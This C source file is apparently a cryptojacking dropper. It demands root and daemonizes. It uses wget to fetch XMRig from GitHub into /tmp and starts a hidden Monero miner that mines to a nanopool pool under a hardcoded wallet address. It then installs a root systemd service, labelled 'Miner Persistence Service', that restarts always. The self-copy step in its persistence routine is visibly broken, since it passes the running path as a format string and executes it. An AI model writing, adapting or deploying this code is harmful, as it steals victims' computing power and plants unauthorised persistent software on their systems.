#include <stdio.h>
#include <stdlib.h>
#include <sys/syslog.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <syslog.h>
#include <sys/types.h>
#include <sys/stat.h>

void check_root() {
    if (getuid() != 0) {
        printf("❌ Root permission required!\n");
        exit(1);
    }
}

void daemonize() {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    setsid();

    if (chdir("/") < 0) {
        syslog(LOG_ERR, "Failed to change directory to /");
        exit(errno);
    }

    close(STDIN_FILENO);
    close(STDERR_FILENO);
    close(STDOUT_FILENO);

    int fd0 = open("/dev/null", O_RDWR);
    int fd1 = dup(0);
    int fd2 = dup(0);

    openlog("daemon", LOG_CONS | LOG_PID, LOG_DAEMON);

    if (fd0 != 0 || fd1 != 1 || fd2 != 2) {
        syslog(LOG_ERR, "Unexpected file descriptors %d, %d, %d", fd0, fd1, fd2);
        exit(errno);
    }
}

void download_and_run_xmrig() {
    syslog(LOG_INFO, "Starting XMRig setup...");

    // Change to /tmp directory
    if (chdir("/tmp") != 0) {
        syslog(LOG_ERR, "Failed to change to /tmp");
        return;
    }

    // Download the tar.gz
    int status = system("wget -q https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz -O xmrig.tar.gz");
    if (status != 0) {
        syslog(LOG_ERR, "Failed to download XMRig");
        return;
    }
    syslog(LOG_INFO, "Downloaded XMRig release");

    // Extract the archive
    status = system("tar -xzf xmrig.tar.gz");
    if (status != 0) {
        syslog(LOG_ERR, "Failed to extract XMRig");
        return;
    }
    syslog(LOG_INFO, "Extracted XMRig archive");


    pid_t pid = fork();
    if (pid == 0) {
        // Child process
        int fd = open("/tmp/xmrig.log", O_WRONLY | O_CREAT | O_APPEND, 0644);
        if (fd < 0) {
            syslog(LOG_ERR, "Failed to open log file for XMRig");
            exit(1);
        }

        dup2(fd, STDOUT_FILENO);
        dup2(fd, STDERR_FILENO);
        close(fd);


        status = system("nohup ./xmrig-6.22.2/xmrig --donate-level 1 --coin monero -o xmr-asia1.nanopool.org:10343 -u 47oiyRPtfmg4YK4ggJnCHHB2XmMK31NXKiwDAfnGZczMYGgQM7cJRa6jLC9M2hK81jTLze5vTPcrjFb93T5nkREfUHSsYky -k --tls 2>&1 | tee -a /tmp/xmrig.log >/dev/null &");
        
        if(status==0){
          syslog(LOG_INFO,"IT's running"); 
        }
        exit(1);
    } else if (pid > 0) {
        syslog(LOG_INFO, "XMRig process forked successfully");
    } else {
        syslog(LOG_ERR, "Fork failed for XMRig");
    }
    if (status == 0) {
        syslog(LOG_INFO, "XMRig started successfully");
    } else {
        syslog(LOG_ERR, "Failed to start XMRig miner");
    }
  }

void persistent(){
  const char *target_path = "/usr/local/bin/daemon";
  char current_path[4096];
  ssize_t len = readlink("/proc/self/exe", current_path, sizeof(current_path)-1);
  if (len == -1) {
        syslog(LOG_ERR, "Could not read /proc/self/exe");
        return;
  }

  current_path[len] = '\0';

  char copy_path[4096];
  snprintf(copy_path, sizeof(copy_path), current_path,target_path);
  system(copy_path);

  FILE *service = fopen("/etc/systemd/system/xmrig-daemon.service", "w");
  fprintf(service,
        "[Unit]\nDescription=Miner Persistence Service\nAfter=network.target\n\n"
        "[Service]\nExecStart=%s\nRestart=always\nUser=root\nStandardOutput=null\nStandardError=null\n\n"
        "[Install]\nWantedBy=multi-user.target\n", target_path);
  fclose(service);

  system("systemctl daemon-reload");
  system("systemctl enable xmrig-daemon.service");
  system("systemctl start xmrig-daemon.service");
}

int main() {
    check_root();
    daemonize();
    download_and_run_xmrig();
    persistent();
    return 0;
}
